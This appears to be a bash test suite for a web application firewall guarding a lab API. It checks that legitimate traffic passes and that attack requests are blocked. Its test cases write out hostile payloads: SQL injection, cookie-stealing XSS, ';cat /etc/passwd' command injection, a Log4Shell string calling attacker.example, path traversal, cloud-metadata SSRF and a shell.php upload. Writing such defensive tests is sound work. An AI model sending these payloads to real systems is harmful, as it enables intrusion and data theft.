#!/usr/bin/env bash
# waf-test.sh: end-to-end tests of the WAF in front of the API simulator.
#
# Every case sends one request and checks two things:
#   1. the HTTP status the client got;
#   2. whether the request REACHED the API or was stopped at the edge.
#
# (2) is the point of the simulator: each request carries a unique
# X-Test-Case header, and the API records every request it receives in
# /lab/calls. After the run, the suite reads that buffer: a blocked
# request must be absent, an allowed one present. A response-phase
# block (data leak) is the interesting middle case: present in the API
# buffer (the API answered) but the client got a 403.
#
# Usage:
#   tests/waf-test.sh                       # against http://localhost:8080
#   BASE_URL=http://localhost:18080 tests/waf-test.sh
#   LAB_TOKEN=... VERBOSE=1 tests/waf-test.sh
#
# Requires: bash, curl. The API must run with LAB_ADMIN_TOKEN=$LAB_TOKEN.
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:8080}"
LAB_TOKEN="${LAB_TOKEN:-lab-token}"
VERBOSE="${VERBOSE:-0}"

# Client addresses, chosen with X-Forwarded-For (nginx trusts the Docker
# networks as a proxy; see nginx.conf). TEST-NET ranges, RFC 5737.
ADMIN_IP="10.10.1.5"        # admin-networks.txt
SCANNER_IP="10.10.99.10"    # trusted-scanners.txt
DENIED_IP="203.0.113.7"     # ip-denylist.txt
UA="coraza-apilab-tests/1.0"

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

pass=0
fail=0
n=0
declare -a ids=() reach=() names=()

if [ -t 1 ]; then green=$'\e[32m'; red=$'\e[31m'; dim=$'\e[2m'; off=$'\e[0m'; else green=""; red=""; dim=""; off=""; fi

ok() { pass=$((pass + 1)); printf '%sPASS%s %s\n' "$green" "$off" "$*"; }
ko() { fail=$((fail + 1)); printf '%sFAIL%s %s\n' "$red" "$off" "$*"; }

# t <name> <expected-status> <reach: yes|no|-> [curl args...] <path>
#
# Each case gets its own "internet" client IP (192.0.2.N) unless the
# curl args set X-Forwarded-For, so the per-IP rate limits never mix
# test cases.
t() {
	local name="$1" want="$2" should_reach="$3"
	shift 3
	local path="${*: -1}"
	local args=("${@:1:$#-1}")
	n=$((n + 1))
	local id
	id="$(printf 'case-%03d-%s' "$n" "$name")"
	local xff=(-H "X-Forwarded-For: 192.0.2.$((n % 200 + 1))")
	local a
	for a in "${args[@]}"; do
		case "$a" in X-Forwarded-For:*) xff=() ;; esac
	done

	local got
	got="$(curl -s -m 15 -o "$tmp/body" -w '%{http_code}' \
		-A "$UA" -H "X-Test-Case: $id" "${xff[@]}" \
		"${args[@]}" "$BASE_URL$path" || true)"
	cp "$tmp/body" "$tmp/$id.body" 2>/dev/null || true

	ids+=("$id")
	reach+=("$should_reach")
	names+=("$name")

	if [ "$got" = "$want" ]; then
		ok "$(printf '%-44s status %s' "$id" "$got")"
	else
		ko "$(printf '%-44s status %s, expected %s' "$id" "$got" "$want")"
		head -c 300 "$tmp/body"; echo
	fi
	if [ "$VERBOSE" = 1 ]; then
		printf '%s     %s%s\n' "$dim" "$(head -c 200 "$tmp/body")" "$off"
	fi
}

lab_calls() {
	curl -s -m 10 -A "$UA" -H "X-Forwarded-For: $ADMIN_IP" -H "X-Lab-Token: $LAB_TOKEN" "$@"
}

echo "== target: $BASE_URL"
curl -s -m 5 -o /dev/null "$BASE_URL/health" || { echo "API not reachable at $BASE_URL"; exit 1; }
lab_calls -X POST "$BASE_URL/lab/calls/reset" >/dev/null

json=(-H "Content-Type: application/json")
form=(-H "Content-Type: application/x-www-form-urlencoded")

echo "== baseline: legitimate traffic must pass"
t health                 200 yes /health
t version                200 yes /version
t users-list             200 yes '/api/v1/users?page=1&per_page=5'
t user-by-id             200 yes /api/v1/users/1
t search                 200 yes '/api/v1/search?q=security&limit=5'
t search-apostrophe      200 yes "/api/v1/search?q=O%27Brien"
t login                  200 yes "${json[@]}" -d '{"username":"admin","password":"lab-password-123456"}' /api/v1/auth/login
token="$(sed -n 's/.*"token":"\([^"]*\)".*/\1/p' "$tmp/body")"
t auth-me                200 yes -H "Authorization: Bearer $token" /api/v1/auth/me
t user-create            201 yes "${json[@]}" -d '{"name":"Ana Lima","email":"ana@lab.example","department":"security","role":"viewer"}' /api/v1/users
t user-patch             200 yes "${json[@]}" -X PATCH -d '{"department":"sre"}' /api/v1/users/2
t ticket-create          201 yes "${json[@]}" -d '{"title":"VPN is slow","description":"Since Monday, about 30% packet loss.","severity":"medium","tags":["vpn","network"]}' /api/v1/tickets
t feedback-form          200 yes "${form[@]}" -d 'rating=5&name=Ana&comment=Great+service%2C+thanks%21' /api/v1/forms/feedback
t graphql                200 yes "${json[@]}" -d '{"query":"query { users(first: 10) { id name } }","variables":{"first":10}}' /api/v1/graphql
t webhook                200 yes "${json[@]}" -d '{"event":"invoice.paid","id":"evt_123","amount":4200}' /api/v1/webhooks/receive
t upload                 201 yes -F 'file=@/etc/hostname;filename=report.txt' /api/v1/files/upload
t static                 200 yes /static/robots.txt
t openapi-spec           200 yes /openapi.json
t swagger-ui             200 yes /docs
t referer                200 yes -H 'Referer: https://portal.lab.example/dashboard?tab=1' /version
t method-put             200 yes -X PUT /lab/method
t slow                   200 yes '/lab/slow?ms=100'
t large                  200 yes '/lab/large?bytes=1024'
t stream                 200 yes /lab/stream
t backend-503            503 yes /lab/status/503
t admin-from-vpn         200 yes -H "X-Forwarded-For: $ADMIN_IP" /admin/status

echo "== 100 edge network: client address and route ACLs"
t ip-denylist            403 no  -H "X-Forwarded-For: $DENIED_IP" /version
t admin-from-internet    403 no  /admin/status
t internal-from-internet 403 no  /internal/debug
t metrics-from-internet  403 no  /metrics
t trusted-scanner-sqli   200 yes -H "X-Forwarded-For: $SCANNER_IP" "/api/v1/search?q=1%27%20OR%201%3D1--"

echo "== 110 protocol"
t host-not-served        400 no  -H 'Host: evil.example' /version
hdrs=(); for i in $(seq 1 41); do hdrs+=(-H "X-Filler-$i: x"); done
t too-many-headers       400 no  "${hdrs[@]}" /version
t duplicate-content-type 400 no  -H 'Content-Type: application/json' -H 'Content-Type: text/plain' -d '{}' /api/v1/webhooks/receive
t delete-on-reports      405 no  -X DELETE /api/v1/reports
t method-propfind        403 no  -X PROPFIND /version
t http-1.0               403 no  --http1.0 /version
t trace-nginx            405 no  -X TRACE /version

echo "== 120 user-agent and anomaly scoring"
t scanner-sqlmap         403 no  -A 'sqlmap/1.8.4#stable (https://sqlmap.org)' /version
t scanner-ffuf           403 no  -A 'Fuzz Faster U Fool v2.1.0 ffuf' /version
t library-on-login       403 no  -A 'python-requests/2.32.3' "${json[@]}" -d '{"username":"admin","password":"x"}' /api/v1/auth/login
t library-elsewhere      200 yes -A 'python-requests/2.32.3' /version
t no-user-agent          200 yes -A '' /version
t no-accept              200 yes -H 'Accept:' /version
t no-ua-no-accept        403 no  -A '' -H 'Accept:' /version

echo "== 130 uri"
t uri-too-long           414 no  "/api/v1/search?q=$(printf 'a%.0s' $(seq 1 2100))"
t encoded-slash          400 no  '/static/..%2f..%2fetc%2fpasswd'
t dotgit                 404 no  /api/v1/.git/config
t dotenv                 404 no  /.env
t backup-file            404 no  /api/v1/users.sql
t not-in-inventory       404 no  /wp-admin/install.php
t static-not-allowed     404 no  /static/secret.txt
t dot-segments-nginx     400 no  --path-as-is /static/../../etc/passwd

echo "== 140 api contract"
t user-id-not-numeric    400 no  /api/v1/users/abc
t user-id-sqli           400 no  "/api/v1/users/1%20OR%201=1"
t report-id-format       400 no  /api/v1/reports/rep-1/download
t status-code-format     400 no  /lab/status/999
t search-q-too-long      400 no  "/api/v1/search?q=$(printf 'b%.0s' $(seq 1 150))"
t search-limit-range     400 no  '/api/v1/search?q=x&limit=500'
t slow-above-cap         400 no  '/lab/slow?ms=5000'
t large-above-cap        400 no  '/lab/large?bytes=1000000'
t json-route-wrong-ct    415 no  -H 'Content-Type: text/plain' -d '{"name":"x"}' /api/v1/users
t form-route-wrong-ct    415 no  "${json[@]}" -d '{"rating":5}' /api/v1/forms/feedback
t upload-wrong-ct        415 no  -H 'Content-Type: text/plain' -d 'hello' /api/v1/files/upload
t mass-assignment        400 no  "${json[@]}" -d '{"name":"x","email":"x@lab.example","department":"d","role":"viewer","is_admin":true}' /api/v1/users
t role-not-in-enum       400 no  "${json[@]}" -d '{"name":"x","email":"x@lab.example","department":"d","role":"superuser"}' /api/v1/users
t ticket-too-many-tags   400 no  "${json[@]}" -d '{"title":"t","severity":"low","tags":["1","2","3","4","5","6","7","8","9","10","11"]}' /api/v1/tickets
t login-extra-field      400 no  "${json[@]}" -d '{"username":"admin","password":"x","remember":"yes"}' /api/v1/auth/login

echo "== 150 auth"
t basic-auth             401 no  -u admin:secret /version
t bearer-malformed       401 no  -H 'Authorization: Bearer abc' /api/v1/auth/me
t me-without-token       401 no  /api/v1/auth/me

echo "== 160 payload (lab rules) and CRS"
t crs-sqli               403 no  "/api/v1/search?q=1%27%20UNION%20SELECT%20password%20FROM%20users--"
t crs-xss                403 no  "${json[@]}" -d '{"title":"<script>alert(document.cookie)</script>","severity":"low"}' /api/v1/tickets
t crs-rce                403 no  "/api/v1/search?q=%3Bcat%20%2Fetc%2Fpasswd"
# shellcheck disable=SC2016 # literal payload, must not expand
t crs-log4shell          403 no  -A '${jndi:ldap://attacker.example/a}' /version
t crs-lfi-arg            403 no  -H 'Content-Type: application/octet-stream' --data-binary 'x' '/api/v1/files/upload?name=../../etc/passwd'
t crs-proto-pollution    403 no  "${json[@]}" -d '{"__proto__":{"isAdmin":true}}' /api/v1/webhooks/receive
t ssrf-metadata          403 no  "${json[@]}" -d '{"callback_url":"http://169.254.169.254/latest/meta-data/"}' /api/v1/webhooks/receive
t referer-invalid        403 no  -H 'Referer: not a url' /version
t ssrf-private           403 no  "${json[@]}" -d '{"callback_url":"http://10.0.0.5:8500/v1/kv"}' /api/v1/webhooks/receive
t graphql-introspection  403 no  "${json[@]}" -d '{"query":"{ __schema { types { name } } }"}' /api/v1/graphql
aliases=""; for i in $(seq 1 25); do aliases="$aliases a$i: users { id }"; done
t graphql-aliases        403 no  "${json[@]}" -d "{\"query\":\"query {$aliases }\"}" /api/v1/graphql
t upload-php             403 no  -F 'file=@/etc/hostname;filename=shell.php' /api/v1/files/upload
t ssti-ticket            403 no  "${json[@]}" -d '{"title":"hello {{7*7}}","severity":"low"}' /api/v1/tickets
t admin-config-role      403 no  -H "X-Forwarded-For: $ADMIN_IP" "${json[@]}" -d '{"role":"admin","theme":"dark"}' /admin/config
t broken-json            400 no  "${json[@]}" -d '{"name": "x",' /api/v1/users
deep="$(printf '{"a":%.0s' $(seq 1 40))1$(printf '}%.0s' $(seq 1 40))"
t json-too-deep          400 no  "${json[@]}" -d "$deep" /api/v1/webhooks/receive

echo "== body size: three layers"
head -c 1572864 /dev/zero | tr '\0' 'a' > "$tmp/1.5m"
head -c 3145728 /dev/zero | tr '\0' 'a' > "$tmp/3m"
head -c 9437184 /dev/zero | tr '\0' 'a' > "$tmp/9m"
t body-1.5m-api          413 yes -H 'Content-Type: text/plain' --data-binary "@$tmp/1.5m" /api/v1/webhooks/receive
t body-3m-coraza         413 no  -H 'Content-Type: text/plain' --data-binary "@$tmp/3m" /api/v1/webhooks/receive
t body-9m-nginx          413 no  -H 'Content-Type: text/plain' --data-binary "@$tmp/9m" /api/v1/webhooks/receive

echo "== 910 response inspection (the API answered, the client did not get it)"
t canary-in-body         403 yes /lab/response-marker
t secret-in-body         403 yes '/lab/echo?key=AKIAIOSFODNN7EXAMPLE'

echo "== proof of arrival: /lab/calls"
lab_calls "$BASE_URL/lab/calls" > "$tmp/calls.json"
for i in "${!ids[@]}"; do
	id="${ids[$i]}"
	[ "${reach[$i]}" = "-" ] && continue
	if grep -q "\"x_test_case\":\"$id\"" "$tmp/calls.json"; then arrived=yes; else arrived=no; fi
	if [ "$arrived" = "${reach[$i]}" ]; then
		ok "$(printf '%-44s reached API: %s' "$id" "$arrived")"
	else
		ko "$(printf '%-44s reached API: %s, expected %s' "$id" "$arrived" "${reach[$i]}")"
	fi
	# Every request stopped at the edge must say so in its body.
	if [ "${reach[$i]}" = "no" ] && ! grep -q '"source":"edge"' "$tmp/$id.body" 2>/dev/null; then
		ko "$(printf '%-44s edge response without "source":"edge"' "$id")"
	fi
done

echo "== rate limiting (nginx limit_req; Coraza has no cross-request state)"
codes=""
for i in $(seq 1 10); do
	codes="$codes $(curl -s -m 5 -o /dev/null -w '%{http_code}' -A "$UA" -H 'X-Forwarded-For: 192.0.2.250' \
		"${json[@]}" -d '{"username":"admin","password":"wrong-password"}' "$BASE_URL/api/v1/auth/login")"
done
if [[ "$codes" == *429* ]]; then ok "login burst (10 in a row) -> $codes"; else ko "login burst: no 429 in$codes"; fi

codes=""
for i in $(seq 1 80); do
	codes="$codes $(curl -s -m 5 -o /dev/null -w '%{http_code}' -A "$UA" -H 'X-Forwarded-For: 192.0.2.251' "$BASE_URL/version")"
done
n429="$(grep -o 429 <<<"$codes" | wc -l)"
if [ "$n429" -gt 0 ]; then ok "general burst (80 in a row) -> $n429 x 429"; else ko "general burst: no 429"; fi

echo
echo "== $pass passed, $fail failed"
[ "$fail" -eq 0 ]
